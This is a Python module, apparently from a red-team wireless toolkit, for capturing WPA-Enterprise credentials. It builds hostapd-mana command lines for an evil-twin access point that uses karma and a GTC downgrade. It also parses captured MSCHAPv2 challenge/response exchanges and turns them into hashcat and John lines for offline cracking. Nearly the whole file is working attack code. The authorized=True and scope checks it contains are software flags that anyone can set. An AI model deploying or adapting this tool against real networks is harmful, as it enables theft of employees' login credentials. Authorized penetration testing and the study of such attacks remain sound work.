"""WPA-Enterprise EAP credential capture — the corporate red-team capability.

Against a WPA-Enterprise (802.1X) network, the classic authorized-test move is a
rogue enterprise AP (evil twin) that offers EAP methods; when a client tries to
authenticate, you capture the MSCHAPv2 challenge/response (a crackable hash) or,
on a GTC downgrade, a cleartext inner credential. This is the eaphammer /
hostapd-mana playbook — the "real job" capability pwnagotchi never had.

It is firing-capable (it transmits a rogue AP), so it is gated exactly like the
rest of redux's offense:
  - **Scope decides WHERE** — the SSID you mimic must be in the central Scope.
  - **Posture maps to transmit** — it refuses unless offense is active, and it
    refuses without an explicit `authorized=True`.

The radio/hostapd-mana stand-up is hardware; this module is the pure, testable
core: the gated plan builder, and — the gem — turning a captured EAP-MSCHAPv2
exchange into a crackable hashcat/John line (the enterprise analogue of
AngryOxide's 22000 output). Honest tool-absence for the AP binary.
"""
from __future__ import annotations

import shutil
from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple


# --- captured credentials → crackable artifacts ------------------------------ #

@dataclass(frozen=True)
class MschapV2Credential:
    """A captured PEAP/TTLS-MSCHAPv2 inner exchange — crackable offline."""
    username: str
    challenge: str              # 8-byte authenticator challenge, hex
    response: str               # 24-byte NT response, hex
    domain: str = ""

    def hashcat_5500(self) -> str:
        """hashcat -m 5500 (NetNTLMv1) line: user::::<response>:<challenge>."""
        return f"{self.username}::::{self.response.lower()}:{self.challenge.lower()}"

    def john_netntlm(self) -> str:
        """John NETNTLM line: user:$NETNTLM$<challenge>$<response>."""
        return f"{self.username}:$NETNTLM${self.challenge.lower()}${self.response.lower()}"


@dataclass(frozen=True)
class GtcCredential:
    """A GTC-downgrade capture — the inner credential arrives in the clear."""
    username: str
    password: str               # already cleartext — nothing to crack

    def as_line(self) -> str:
        return f"{self.username}:{self.password}"


def _hexish(s: str) -> bool:
    s = (s or "").strip().lower()
    return bool(s) and all(c in "0123456789abcdef" for c in s)


def parse_hostapd_wpe(logtext: str) -> List[MschapV2Credential]:
    """Parse hostapd-wpe / mana style output into MSCHAPv2 credentials.

    ⚠ NEEDS-HARDWARE format: models the common hostapd-wpe block
    (`username:`, `challenge:`, `response:` lines, colon/hyphen-separated hex).
    Validate against your build's real output before trusting it; the crackable
    conversion above does NOT depend on this parser — it takes fields directly.
    """
    creds: List[MschapV2Credential] = []
    cur = {}
    for raw in (logtext or "").splitlines():
        line = raw.strip()
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key = key.strip().lower()
        val = val.strip().replace(":", "").replace("-", "")
        if key == "username":
            cur = {"username": val}
        elif key == "challenge" and _hexish(val):
            cur["challenge"] = val
        elif key == "response" and _hexish(val):
            cur["response"] = val
        if {"username", "challenge", "response"} <= set(cur):
            creds.append(MschapV2Credential(cur["username"], cur["challenge"], cur["response"]))
            cur = {}
    return creds


# --- the gated rogue-AP plan ------------------------------------------------- #

@dataclass
class EapConfig:
    methods: Tuple[str, ...] = ("PEAP", "TTLS", "GTC")   # GTC downgrade for cleartext
    iface: str = "wlan1"
    binary: str = "hostapd-mana"
    cert: str = ">>> USER INPUT REQUIRED <<< path to the AP's server cert (.pem)"
    karma: bool = True                                   # respond to any directed probe


@dataclass(frozen=True)
class EapPlan:
    runnable: bool
    ssid: str
    methods: List[str]
    argv: List[str]
    reason: str

    def to_dict(self) -> dict:
        return {"runnable": self.runnable, "ssid": self.ssid, "methods": list(self.methods),
                "argv": list(self.argv), "reason": self.reason}


def authorize_eap(scope, ssid: str, *, authorized: bool, active: bool):
    """(ok, reason) — the same aiming + posture gate the rest of offense uses."""
    if not authorized:
        return False, ("refused: pass authorized=True to confirm this is an enterprise "
                       "test you are permitted to run")
    if not active:
        return False, "refused: offense posture is passive/detection-only (no transmit)"
    if scope is None:
        return False, "refused: no scope — arm the target SSID first"
    ok, reason = scope.authorize(ssid=ssid)
    if not ok:
        return False, f"refused: SSID '{ssid}' is not in the authorized scope ({reason})"
    return True, f"authorized: enterprise EAP harvest for '{ssid}' — {reason}"


@dataclass
class EapHarvester:
    config: EapConfig = field(default_factory=EapConfig)
    which: Callable[[str], Optional[str]] = shutil.which

    def available(self) -> bool:
        return self.which(self.config.binary) is not None

    def plan(self, scope, ssid: str, *, authorized: bool = False, active: bool = True) -> EapPlan:
        ok, reason = authorize_eap(scope, ssid, authorized=authorized, active=active)
        if not ok:
            return EapPlan(False, ssid, list(self.config.methods), [], reason)
        argv = [self.config.binary, "-i", self.config.iface, "--ssid", ssid,
                "--eap-methods", ",".join(self.config.methods), "--cert", self.config.cert]
        if self.config.karma:
            argv.append("--karma")
        return EapPlan(True, ssid, list(self.config.methods), argv,
                       f"{reason}; captures MSCHAPv2 challenge/response → hashcat -m 5500")
